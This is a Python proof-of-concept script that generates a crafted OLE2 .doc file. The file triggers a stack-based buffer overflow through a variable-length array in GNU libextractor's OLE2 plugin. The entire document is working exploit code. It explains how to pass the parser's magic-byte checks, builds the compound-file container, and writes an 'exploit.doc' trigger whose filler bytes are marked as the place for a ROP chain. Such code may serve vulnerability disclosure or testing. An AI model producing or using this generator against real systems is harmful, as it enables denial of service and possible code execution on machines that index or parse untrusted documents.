#!/usr/bin/env python3
"""
Malicious OLE2 (.doc) Payload Generator
========================================================
Author: Haitam Lazaar

Generates a valid Microsoft Compound Document File (OLE2) that triggers
a stack-based buffer overflow in GNU libextractor's OLE2 plugin.

The vulnerability is in process_star_office() at ole2_extractor.c:349:
    char buf[size];  // VLA up to 4MB from attacker-controlled stream size

Usage:
    python3 gen_payload.py [output.doc] [size_in_mb]
    python3 gen_payload.py exploit.doc       # 2MB payload
    python3 gen_payload.py exploit.doc 3.9   # 3.9MB payload

No dependencies beyond Python 3 standard library.
"""
import struct
import sys
import os

# Default VLA size: 2MB overflows thread stacks (typically 1-2MB)
DEFAULT_SIZE = 2 * 1024 * 1024


def build_sfx_stream(size):
    """
    Build the SfxDocumentInfo stream content.
    
    The process_star_office() function checks these bytes before
    proceeding to allocate the VLA. We must pass all checks:
    
        if (buf[0] != 0x0F)           → must be 0x0F
        if (buf[1] != 0x0)            → must be 0x00
        if (strncmp(&buf[2], "SfxDocumentInfo", 15)) → must match
        if (buf[0x11] != 0x0B)        → must be 0x0B
        if (buf[0x13] != 0x00)        → must be 0x00 (not password-protected)
        if (buf[0x12] != 0x00)        → must be 0x00
    
    After passing these checks, the function accesses fixed offsets
    (0x93-0x296) to extract metadata strings. Our payload fills these
    with 'A' (0x41). In a weaponized exploit, these bytes would contain
    a ROP chain for the target architecture.
    """
    buf = bytearray(size)

    # Magic bytes required by process_star_office() validation
    buf[0] = 0x0F                       # Magic byte 1
    buf[1] = 0x00                       # Magic byte 2
    buf[2:17] = b"SfxDocumentInfo"      # 15-byte identifier string
    buf[0x11] = 0x0B                    # Required flag
    buf[0x12] = 0x00                    # Not password-protected
    buf[0x13] = 0x00                    # Required zero

    # Fill remainder with recognizable pattern
    # In a real exploit: ROP gadgets, shellcode address, etc.
    for i in range(0x14, size):
        buf[i] = 0x41  # 'A'

    return bytes(buf)


def write_ole2(path, stream_data):
    """
    Write a minimal valid OLE2/CFB (Compound File Binary) container.
    
    OLE2 structure:
        [512-byte Header]
        [Sector 0: Directory] - contains Root Entry + SfxDocumentInfo entry
        [Sectors 1..N: Stream Data] - the malicious payload
        [FAT Sectors] - maps the sector chain
    
    The directory entry for "SfxDocumentInfo" tells libgsf the stream size,
    which libextractor then uses as the VLA size: char buf[size].
    """
    SECTOR_SIZE = 512
    stream_size = len(stream_data)

    # Calculate how many sectors we need for the stream data
    stream_sectors = (stream_size + SECTOR_SIZE - 1) // SECTOR_SIZE

    # Calculate FAT (File Allocation Table) size
    # FAT maps each sector to the next in its chain, or marks it as end/free
    fat_entries_per_sector = SECTOR_SIZE // 4  # Each entry is 4 bytes (int32)
    dir_sectors = 1
    total_data_sectors = dir_sectors + stream_sectors
    fat_sectors = (total_data_sectors + fat_entries_per_sector) // fat_entries_per_sector

    # Ensure FAT is large enough to describe itself too
    while (dir_sectors + stream_sectors + fat_sectors + fat_entries_per_sector - 1) // fat_entries_per_sector > fat_sectors:
        fat_sectors += 1

    total_sectors = dir_sectors + stream_sectors + fat_sectors

    # Sector layout:
    #   Sector 0:                    Directory
    #   Sectors 1..stream_sectors:   SfxDocumentInfo data (our payload)
    #   Remaining:                   FAT
    stream_start = 1
    fat_start = 1 + stream_sectors

    # === CFB Header (512 bytes) ===
    header = bytearray(SECTOR_SIZE)
    header[0:8] = b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1'  # OLE2 magic signature
    struct.pack_into('<H', header, 0x18, 0x003E)          # Minor version
    struct.pack_into('<H', header, 0x1A, 0x0003)          # Major version (3 = 512-byte sectors)
    struct.pack_into('<H', header, 0x1C, 0xFFFE)          # Byte order: little-endian
    struct.pack_into('<H', header, 0x1E, 0x0009)          # Sector size: 2^9 = 512
    struct.pack_into('<H', header, 0x20, 0x0006)          # Mini sector size: 2^6 = 64
    struct.pack_into('<I', header, 0x2C, fat_sectors)     # Number of FAT sectors
    struct.pack_into('<i', header, 0x30, 0)               # First directory sector (sector 0)
    struct.pack_into('<I', header, 0x38, 0x1000)          # Mini stream cutoff (4096)
    struct.pack_into('<i', header, 0x3C, -2)              # First mini FAT sector: none (ENDOFCHAIN)
    struct.pack_into('<i', header, 0x44, -2)              # First DIFAT sector: none (ENDOFCHAIN)

    # DIFAT array in header: points to FAT sectors
    for i in range(109):
        struct.pack_into('<i', header, 0x4C + i * 4,
                         fat_start + i if i < fat_sectors else -1)  # -1 = FREESECT

    # === Directory Sector (512 bytes, holds 4 entries of 128 bytes each) ===
    directory = bytearray(SECTOR_SIZE)

    # Entry 0: Root Entry (required)
    root_name = "Root Entry".encode('utf-16-le')
    directory[0:len(root_name)] = root_name
    struct.pack_into('<H', directory, 0x40, len(root_name) + 2)  # Name size (incl. null)
    directory[0x42] = 5   # Object type: Root Storage
    directory[0x43] = 1   # Color: black (red-black tree)
    struct.pack_into('<i', directory, 0x44, -1)   # Left sibling: none
    struct.pack_into('<i', directory, 0x48, -1)   # Right sibling: none
    struct.pack_into('<i', directory, 0x4C, 1)    # Child: entry 1 (SfxDocumentInfo)
    struct.pack_into('<i', directory, 0x74, -2)   # Start sector: ENDOFCHAIN (no mini stream)

    # Entry 1: SfxDocumentInfo (our malicious stream)
    off = 128  # Second directory entry starts at byte 128
    sfx_name = "SfxDocumentInfo".encode('utf-16-le')
    directory[off:off + len(sfx_name)] = sfx_name
    struct.pack_into('<H', directory, off + 0x40, len(sfx_name) + 2)  # Name size
    directory[off + 0x42] = 2   # Object type: Stream
    directory[off + 0x43] = 1   # Color: black
    struct.pack_into('<i', directory, off + 0x44, -1)   # Left sibling: none
    struct.pack_into('<i', directory, off + 0x48, -1)   # Right sibling: none
    struct.pack_into('<i', directory, off + 0x4C, -1)   # Child: none (it's a stream)
    struct.pack_into('<i', directory, off + 0x74, stream_start)    # Start sector
    struct.pack_into('<I', directory, off + 0x78, stream_size)     # Stream size (THE TRIGGER)

    # === FAT (File Allocation Table) ===
    fat_data = bytearray(fat_sectors * SECTOR_SIZE)

    # Sector 0 (directory): end of chain
    struct.pack_into('<i', fat_data, 0 * 4, -2)  # ENDOFCHAIN

    # Sectors 1..stream_sectors: linked chain for stream data
    for s in range(stream_sectors):
        sec_id = stream_start + s
        next_sec = sec_id + 1 if s < stream_sectors - 1 else -2  # -2 = ENDOFCHAIN
        struct.pack_into('<i', fat_data, sec_id * 4, next_sec)

    # FAT sectors themselves: marked as FATSECT (-3)
    for f in range(fat_sectors):
        struct.pack_into('<i', fat_data, (fat_start + f) * 4, -3)

    # Remaining entries: FREESECT (-1)
    for i in range(total_sectors, fat_sectors * fat_entries_per_sector):
        struct.pack_into('<i', fat_data, i * 4, -1)

    # === Stream Data (padded to sector boundary) ===
    stream_padded = bytearray(stream_sectors * SECTOR_SIZE)
    stream_padded[:stream_size] = stream_data

    # === Write the complete OLE2 file ===
    with open(path, 'wb') as f:
        f.write(header)         # 512 bytes
        f.write(directory)      # 512 bytes (sector 0)
        f.write(stream_padded)  # N * 512 bytes (sectors 1..N)
        f.write(fat_data)       # FAT sectors


if __name__ == '__main__':
    output = sys.argv[1] if len(sys.argv) > 1 else 'exploit.doc'
    size_mb = float(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_SIZE / (1024 * 1024)
    size = int(size_mb * 1024 * 1024)

    # Validate: libextractor allows 0x374 to 4*1024*1024
    if size < 0x374:
        print(f"Error: size must be >= {0x374} bytes (0x374)")
        sys.exit(1)
    if size > 4 * 1024 * 1024:
        print(f"Error: size must be <= 4MB (libextractor rejects larger)")
        sys.exit(1)

    write_ole2(output, build_sfx_stream(size))
    print(f"[+] {output} ({os.path.getsize(output)} bytes)")
    print(f"[+] SfxDocumentInfo stream: {size} bytes ({size / 1024 / 1024:.1f} MB)")
    print(f"[+] Overflows stacks smaller than {size / 1024 / 1024:.1f} MB")
